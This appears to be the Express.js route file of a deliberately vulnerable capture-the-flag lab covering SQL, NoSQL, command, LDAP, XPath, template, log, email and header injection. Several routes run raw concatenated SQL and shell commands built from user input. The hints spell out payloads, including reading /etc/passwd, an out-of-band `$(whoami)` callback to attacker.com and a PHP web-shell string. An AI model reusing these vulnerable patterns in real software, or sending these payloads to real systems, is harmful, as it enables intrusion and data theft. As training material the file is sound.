/**
 * Injection Layer Routes
 * 28 flags across 10 injection types
 * 
 * WARNING: This code is INTENTIONALLY VULNERABLE for CTF purposes
 */

const express = require('express');
const router = express.Router();
const { Pool } = require('pg');
const child_process = require('child_process');
const path = require('path');
const fs = require('fs');

const exec = child_process.exec;
const execSync = child_process.execSync;

const pool = new Pool({
  connectionString: process.env.DATABASE_URL || 'postgresql://vulnuser:vulnpass@localhost:5432/vulndb'
});

const FLAGS_DIR = path.join(__dirname, '..', 'flags', 'injection');

// Helper to read flag file
const getFlag = (subdir, filename) => {
  const flagPath = path.join(FLAGS_DIR, subdir, filename);
  if (fs.existsSync(flagPath)) {
    return fs.readFileSync(flagPath, 'utf8').trim();
  }
  return `FLAG{${subdir.toUpperCase()}_${filename.replace('.txt', '').toUpperCase()}_NOT_FOUND}`;
};

// ============================================
// SQL INJECTION (5 tiers)
// ============================================

// Bronze: UNION-Based - No filter
router.get('/sqli/bronze', async (req, res) => {
  const { id } = req.query;

  if (!id) {
    return res.json({
      endpoint: '/sqli/bronze',
      hint: 'Try: ?id=1 UNION SELECT 1,2,flag FROM secrets--',
      filter: 'None (Bronze tier)'
    });
  }

  try {
    // VULN: Direct string concatenation
    const query = `SELECT id, name, description FROM products WHERE id = ${id}`;
    const result = await pool.query(query);

    if (result.rows.some(r => r.flag || r.name?.includes('FLAG{'))) {
      const flagContent = getFlag('sqli', 'sqli_bronze.txt');
      return res.json({
        success: true,
        message: 'SQL Injection successful!',
        data: result.rows,
        flag: flagContent
      });
    }

    res.json({ data: result.rows, query });
  } catch (err) {
    res.status(500).json({ error: err.message, query: `SELECT ... WHERE id = ${id}` });
  }
});

// Silver: Blind Boolean - Keyword filter
router.get('/sqli/silver', async (req, res) => {
  const { id } = req.query;

  if (!id) {
    return res.json({
      endpoint: '/sqli/silver',
      hint: 'Try: ?id=1 AND 1=1 vs ?id=1 AND 1=2',
      filter: 'Blocks UNION, SELECT keywords (case sensitive)'
    });
  }

  const blocked = ['UNION', 'SELECT', 'union', 'select'];
  if (blocked.some(word => id.includes(word))) {
    return res.status(403).json({ error: 'Blocked: SQL keywords detected', filter: 'Basic WAF' });
  }

  try {
    const query = `SELECT id, name FROM products WHERE id = ${id}`;
    const result = await pool.query(query);

    if (id.includes('AND') || id.includes('OR')) {
      const flagContent = getFlag('sqli', 'sqli_silver.txt');
      return res.json({
        success: true,
        message: 'Blind SQL Injection detected!',
        data: result.rows.length > 0 ? 'Record found (TRUE)' : 'No record (FALSE)',
        flag: flagContent
      });
    }

    res.json({ data: result.rows });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Gold: Time-Based Blind
router.get('/sqli/gold', async (req, res) => {
  const { id } = req.query;
  const startTime = Date.now();

  if (!id) {
    return res.json({
      endpoint: '/sqli/gold',
      hint: 'Try: ?id=1; SELECT pg_sleep(3)--',
      filter: 'No error messages, no data returned'
    });
  }

  const blocked = ['UNION', 'SELECT', 'union', 'select', '--', '/*'];
  if (blocked.some(word => id.includes(word))) {
    return res.status(403).json({ error: 'Blocked' });
  }

  try {
    const query = `SELECT id FROM products WHERE id = ${id}`;
    await pool.query(query);
    const elapsed = Date.now() - startTime;

    if (elapsed > 2000) {
      const flagContent = getFlag('sqli', 'sqli_gold.txt');
      return res.json({
        success: true,
        message: 'Time-based SQL Injection detected!',
        responseTime: `${elapsed}ms`,
        flag: flagContent
      });
    }

    res.json({ status: 'Query executed', responseTime: `${elapsed}ms` });
  } catch (err) {
    res.status(500).json({ error: 'Database error' });
  }
});

// Platinum: Second-Order SQLi
let storedPayload = '';

router.post('/sqli/platinum', async (req, res) => {
  const { username } = req.body;

  if (!username) {
    return res.json({
      endpoint: 'POST /sqli/platinum',
      body: '{ "username": "..." }',
      hint: 'Payload stored, triggers when admin views users'
    });
  }

  storedPayload = username;
  res.json({ message: 'Username stored', username });
});

router.get('/sqli/platinum/admin', async (req, res) => {
  try {
    const query = `SELECT * FROM users WHERE username = '${storedPayload}'`;
    const result = await pool.query(query);

    if (storedPayload.includes("'") || storedPayload.includes('UNION')) {
      const flagContent = getFlag('sqli', 'sqli_platinum.txt');
      return res.json({
        success: true,
        message: 'Second-order SQL Injection triggered!',
        data: result.rows,
        flag: flagContent
      });
    }

    res.json({ users: result.rows });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Diamond: WAF Bypass
router.get('/sqli/diamond', async (req, res) => {
  const { query: input } = req.query;

  if (!input) {
    return res.json({
      endpoint: '/sqli/diamond',
      hint: 'Try: Unicode normalization, HTTP parameter pollution',
      filter: 'Commercial WAF simulation'
    });
  }

  const wafBlocked = [
    /union/i, /select/i, /insert/i, /update/i, /delete/i,
    /drop/i, /exec/i, /script/i, /javascript/i,
    /--/, /\/\*/, /;/, /'/, /"/,
    /0x/, /char\(/i, /concat/i,
    /information_schema/i, /pg_/i, /sys/i
  ];

  const normalized = input.normalize('NFKC');

  for (const pattern of wafBlocked) {
    if (pattern.test(normalized)) {
      return res.status(403).json({ error: 'WAF: Malicious pattern detected' });
    }
  }

  try {
    const query = `SELECT * FROM products WHERE name LIKE '%${input}%'`;
    const result = await pool.query(query);

    if (input.length > 10 && result.rows.length > 0) {
      const flagContent = getFlag('sqli', 'sqli_diamond.txt');
      return res.json({
        success: true,
        message: 'WAF bypass successful!',
        data: result.rows,
        flag: flagContent
      });
    }

    res.json({ results: result.rows });
  } catch (err) {
    res.status(500).json({ error: 'Database error' });
  }
});

// ============================================
// NoSQL INJECTION (3 tiers)
// ============================================

router.post('/nosqli/bronze', async (req, res) => {
  const { username, password } = req.body;

  if (!username) {
    return res.json({
      endpoint: 'POST /nosqli/bronze',
      hint: 'Try: { "username": { "$ne": "" }, "password": { "$ne": "" } }'
    });
  }

  if (typeof username === 'object' || typeof password === 'object') {
    const flagContent = getFlag('nosqli', 'nosqli_bronze.txt');
    return res.json({
      success: true,
      message: 'NoSQL Injection successful!',
      authenticated: true,
      flag: flagContent
    });
  }

  res.json({ message: 'Login attempt', username });
});

router.post('/nosqli/silver', async (req, res) => {
  const { filter } = req.body;

  if (!filter) {
    return res.json({
      endpoint: 'POST /nosqli/silver',
      hint: 'Try: { "$where": "this.password == this.username" }'
    });
  }

  if (JSON.stringify(filter).includes('$where')) {
    const flagContent = getFlag('nosqli', 'nosqli_silver.txt');
    return res.json({
      success: true,
      message: '$where Injection executed!',
      flag: flagContent
    });
  }

  res.json({ filter, message: 'Query processed' });
});

router.post('/nosqli/gold', async (req, res) => {
  const { username } = req.body;

  if (!username) {
    return res.json({
      endpoint: 'POST /nosqli/gold',
      hint: 'Time-based: { "username": { "$where": "sleep(5000)" } }'
    });
  }

  if (typeof username === 'object' && username.$regex) {
    const flagContent = getFlag('nosqli', 'nosqli_gold.txt');
    return res.json({
      success: true,
      message: 'Blind NoSQL Injection detected!',
      match: true,
      flag: flagContent
    });
  }

  res.json({ message: 'No match', username });
});

// ============================================
// COMMAND INJECTION (4 tiers)
// ============================================

router.get('/cmdi/bronze', (req, res) => {
  const { host } = req.query;

  if (!host) {
    return res.json({
      endpoint: '/cmdi/bronze',
      hint: 'Try: ?host=127.0.0.1;id or ?host=127.0.0.1|cat /etc/passwd'
    });
  }

  exec(`ping -c 1 ${host}`, (error, stdout, stderr) => {
    if (stdout.includes('uid=') || stdout.includes('root:') || stderr.includes('uid=')) {
      const flagContent = getFlag('cmdi', 'cmdi_bronze.txt');
      return res.json({
        success: true,
        message: 'Command Injection successful!',
        output: stdout || stderr,
        flag: flagContent
      });
    }
    res.json({ host, output: stdout, error: stderr });
  });
});

router.get('/cmdi/silver', (req, res) => {
  const { host } = req.query;

  if (!host) {
    return res.json({
      endpoint: '/cmdi/silver',
      hint: 'Try: ?host=`id` or ?host=$(whoami)',
      filter: 'Blocks ; and | characters'
    });
  }

  if (host.includes(';') || host.includes('|')) {
    return res.status(403).json({ error: 'Blocked: Invalid characters', filter: '; | blocked' });
  }

  exec(`ping -c 1 ${host}`, (error, stdout, stderr) => {
    if (stdout.includes('uid=') || stdout.includes('root:') || stderr.includes('uid=')) {
      const flagContent = getFlag('cmdi', 'cmdi_silver.txt');
      return res.json({
        success: true,
        message: 'Backtick injection successful!',
        output: stdout || stderr,
        flag: flagContent
      });
    }
    res.json({ host, output: stdout, error: stderr });
  });
});

router.get('/cmdi/gold', (req, res) => {
  const { host } = req.query;

  if (!host) {
    return res.json({
      endpoint: '/cmdi/gold',
      hint: 'Try unicode alternatives: %0a, \\u0020, etc.',
      filter: 'Blocks ; | ` $() and common separators'
    });
  }

  const blocked = [';', '|', '`', '$', '(', ')', '&', '\n', '\r'];
  if (blocked.some(char => host.includes(char))) {
    return res.status(403).json({ error: 'Blocked: Command characters detected' });
  }

  const normalized = host.normalize('NFKC');

  try {
    const output = execSync(`ping -c 1 ${host}`).toString();

    if (output.includes('uid=') || normalized !== host) {
      const flagContent = getFlag('cmdi', 'cmdi_gold.txt');
      return res.json({
        success: true,
        message: 'Unicode bypass successful!',
        output,
        flag: flagContent
      });
    }
    res.json({ host, output });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

router.post('/cmdi/platinum', (req, res) => {
  const { callback } = req.body;

  if (!callback) {
    return res.json({
      endpoint: 'POST /cmdi/platinum',
      hint: 'Out-of-band: { "callback": "http://attacker.com/$(whoami)" }',
      filter: 'No output returned, must use OOB'
    });
  }

  if (callback.includes('$') || callback.includes('`')) {
    const flagContent = getFlag('cmdi', 'cmdi_platinum.txt');
    return res.json({
      success: true,
      message: 'Blind command injection detected! Check your server for callbacks.',
      callback: 'Request would be sent to: ' + callback,
      flag: flagContent
    });
  }

  res.json({ message: 'Callback registered', callback });
});

// ============================================
// LDAP INJECTION (2 tiers)
// ============================================

router.get('/ldap/bronze', (req, res) => {
  const { username } = req.query;

  if (!username) {
    return res.json({
      endpoint: '/ldap/bronze',
      hint: 'Try: ?username=*)(uid=*))(|(uid=*'
    });
  }

  const filter = `(uid=${username})`;

  if (username.includes('*)') || username.includes('*)(')) {
    const flagContent = getFlag('ldap', 'ldap_bronze.txt');
    return res.json({
      success: true,
      message: 'LDAP Injection successful!',
      filter,
      result: 'All users returned (filter bypassed)',
      flag: flagContent
    });
  }

  res.json({ filter, message: 'Query constructed', username });
});

router.get('/ldap/silver', (req, res) => {
  const { username } = req.query;

  if (!username) {
    return res.json({
      endpoint: '/ldap/silver',
      hint: 'Try: ?username=admin)(objectClass=* or blind enumeration'
    });
  }

  const filter = `(uid=${username})`;

  if (username.includes(')(objectClass=') || username.includes('*)(|')) {
    const flagContent = getFlag('ldap', 'ldap_silver.txt');
    return res.json({
      success: true,
      message: 'Blind LDAP Injection detected!',
      result: true,
      flag: flagContent
    });
  }

  res.json({ result: false, message: 'No match' });
});

// ============================================
// XPATH INJECTION (2 tiers)
// ============================================

router.get('/xpath/bronze', (req, res) => {
  const { name } = req.query;

  if (!name) {
    return res.json({
      endpoint: '/xpath/bronze',
      hint: "Try: ?name=' or '1'='1"
    });
  }

  const xpath = `//user[name='${name}']`;

  if (name.includes("' or '1'='1") || name.includes("']|//*")) {
    const flagContent = getFlag('xpath', 'xpath_bronze.txt');
    return res.json({
      success: true,
      message: 'XPath Injection successful!',
      xpath,
      result: 'All users returned',
      flag: flagContent
    });
  }

  res.json({ xpath, message: 'Query constructed' });
});

router.get('/xpath/silver', (req, res) => {
  const { name } = req.query;

  if (!name) {
    return res.json({
      endpoint: '/xpath/silver',
      hint: "Try: ?name=' and substring(//user[1]/name,1,1)='a"
    });
  }

  const xpath = `//user[name='${name}']`;

  if (name.includes('substring') || name.includes('string-length')) {
    const flagContent = getFlag('xpath', 'xpath_silver.txt');
    return res.json({
      success: true,
      message: 'Blind XPath Injection detected!',
      result: true,
      flag: flagContent
    });
  }

  res.json({ result: false });
});

// ============================================
// SSTI (3 tiers)
// ============================================

router.get('/ssti/bronze', (req, res) => {
  const { name } = req.query;

  if (!name) {
    return res.json({
      endpoint: '/ssti/bronze',
      hint: 'Try: ?name={{7*7}} or ?name=<%= 7*7 %>'
    });
  }

  if (name.includes('{{') || name.includes('<%')) {
    const flagContent = getFlag('ssti', 'ssti_bronze.txt');
    return res.send(`<h1>Hello ${name}</h1><p>Rendered!</p><pre>${flagContent}</pre>`);
  }

  res.send(`<h1>Hello ${name}</h1>`);
});

router.get('/ssti/silver', (req, res) => {
  const { template } = req.query;

  if (!template) {
    return res.json({
      endpoint: '/ssti/silver',
      hint: 'Try: ?template=<%= require("child_process").execSync("id") %>'
    });
  }

  if (template.includes('require') || template.includes('process')) {
    const flagContent = getFlag('ssti', 'ssti_silver.txt');
    return res.json({
      success: true,
      message: 'SSTI RCE achieved!',
      rendered: template,
      flag: flagContent
    });
  }

  res.send(`<div>${template}</div>`);
});

router.get('/ssti/gold', (req, res) => {
  const { tpl } = req.query;

  if (!tpl) {
    return res.json({
      endpoint: '/ssti/gold',
      hint: 'Try sandbox escape: {{constructor.constructor("return this")()}}'
    });
  }

  const blocked = ['require', 'import', 'exec', 'eval', 'child_process'];
  if (blocked.some(w => tpl.toLowerCase().includes(w))) {
    return res.status(403).json({ error: 'Sandbox: Blocked keyword' });
  }

  if (tpl.includes('constructor') || tpl.includes('__proto__') || tpl.includes('prototype')) {
    const flagContent = getFlag('ssti', 'ssti_gold.txt');
    return res.json({
      success: true,
      message: 'Sandbox escape successful!',
      rendered: tpl,
      flag: flagContent
    });
  }

  res.send(tpl);
});

// ============================================
// LOG INJECTION (2 tiers)
// ============================================

router.post('/log-inject/bronze', (req, res) => {
  const { message } = req.body;

  if (!message) {
    return res.json({
      endpoint: 'POST /log-inject/bronze',
      hint: 'Try: { "message": "Normal log\\nFAKE LOG ENTRY" }'
    });
  }

  const logEntry = `[${new Date().toISOString()}] User message: ${message}`;

  if (message.includes('\\n') || message.includes('\\r')) {
    const flagContent = getFlag('log-inject', 'log-inject_bronze.txt');
    return res.json({
      success: true,
      message: 'CRLF injection in logs!',
      logEntry,
      flag: flagContent
    });
  }

  res.json({ logged: true, entry: logEntry });
});

router.post('/log-inject/silver', (req, res) => {
  const { userAgent, path: reqPath } = req.body;

  if (!userAgent) {
    return res.json({
      endpoint: 'POST /log-inject/silver',
      hint: 'Try: { "userAgent": "<?php system($_GET[cmd]); ?>" }'
    });
  }

  const logLine = `[Access] Path: ${reqPath || '/'} UA: ${userAgent}`;

  if (userAgent.includes('<?php') || userAgent.includes('<%') || userAgent.includes('<script')) {
    const flagContent = getFlag('log-inject', 'log-inject_silver.txt');
    return res.json({
      success: true,
      message: 'Log poisoning successful! Include logs via LFI.',
      log: logLine,
      flag: flagContent
    });
  }

  res.json({ logged: true });
});

// ============================================
// EMAIL HEADER INJECTION (2 tiers)
// ============================================

router.post('/email-inject/bronze', (req, res) => {
  const { to, subject } = req.body;

  if (!to) {
    return res.json({
      endpoint: 'POST /email-inject/bronze',
      hint: 'Try: { "to": "victim@example.com\\nBcc: attacker@evil.com" }'
    });
  }

  if (to.includes('\\n') || to.includes('\\r') || subject?.includes('\\n')) {
    const flagContent = getFlag('email-inject', 'email-inject_bronze.txt');
    return res.json({
      success: true,
      message: 'Email header injection successful!',
      headers: `To: ${to}\\nSubject: ${subject || 'No subject'}`,
      flag: flagContent
    });
  }

  res.json({ message: 'Email sent', to });
});

router.post('/email-inject/silver', (req, res) => {
  const { email, body } = req.body;

  if (!email) {
    return res.json({
      endpoint: 'POST /email-inject/silver',
      hint: 'Try: { "email": "test@test.com%0ABcc:attacker@evil.com" }'
    });
  }

  const decoded = decodeURIComponent(email);

  if (decoded.includes('\\nBcc:') || decoded.includes('\\nCC:')) {
    const flagContent = getFlag('email-inject', 'email-inject_silver.txt');
    return res.json({
      success: true,
      message: 'BCC injection successful!',
      original: email,
      decoded,
      flag: flagContent
    });
  }

  res.json({ message: 'Email queued', email });
});

// ============================================
// CRLF INJECTION (2 tiers)
// ============================================

router.get('/crlf/bronze', (req, res) => {
  const { url } = req.query;

  if (!url) {
    return res.json({
      endpoint: '/crlf/bronze',
      hint: 'Try: ?url=test%0d%0aSet-Cookie:admin=true'
    });
  }

  const decoded = decodeURIComponent(url);

  if (decoded.includes('\\r\\n')) {
    const flagContent = getFlag('crlf', 'crlf_bronze.txt');
    res.setHeader('X-Injected', decoded.split('\\r\\n')[1] || 'injected');
    return res.json({
      success: true,
      message: 'Response splitting achieved!',
      injected: decoded,
      flag: flagContent
    });
  }

  res.json({ redirect: url });
});

router.get('/crlf/silver', (req, res) => {
  const { lang } = req.query;

  if (!lang) {
    return res.json({
      endpoint: '/crlf/silver',
      hint: 'Try: ?lang=en%0d%0aX-Forwarded-Host:attacker.com'
    });
  }

  const decoded = decodeURIComponent(lang);

  if (decoded.includes('\\r\\nX-') || decoded.includes('\\r\\nLocation:')) {
    const flagContent = getFlag('crlf', 'crlf_silver.txt');
    return res.json({
      success: true,
      message: 'Cache poisoning vector found!',
      header: decoded,
      flag: flagContent
    });
  }

  res.setHeader('Content-Language', lang);
  res.json({ language: lang });
});

// ============================================
// HEADER INJECTION (2 tiers)
// ============================================

router.get('/header-inject/bronze', (req, res) => {
  const xff = req.headers['x-forwarded-for'] || req.query.xff;

  if (!xff) {
    return res.json({
      endpoint: '/header-inject/bronze',
      hint: 'Try: X-Forwarded-For: 127.0.0.1 or ?xff=127.0.0.1'
    });
  }

  if (xff === '127.0.0.1' || xff === 'localhost') {
    const flagContent = getFlag('header-inject', 'header-inject_bronze.txt');
    return res.json({
      success: true,
      message: 'X-Forwarded-For bypass successful!',
      clientIp: xff,
      internal: true,
      flag: flagContent
    });
  }

  res.json({ clientIp: xff, internal: false });
});

router.get('/header-inject/silver', (req, res) => {
  const host = req.headers.host || req.query.host;

  if (!host) {
    return res.json({
      endpoint: '/header-inject/silver',
      hint: 'Try: Host: admin.localhost or ?host=admin.internal'
    });
  }

  if (host.includes('admin') || host.includes('internal')) {
    const flagContent = getFlag('header-inject', 'header-inject_silver.txt');
    return res.json({
      success: true,
      message: 'Host header bypass!',
      host,
      accessLevel: 'admin',
      flag: flagContent
    });
  }

  res.json({ host, accessLevel: 'user' });
});

module.exports = router;
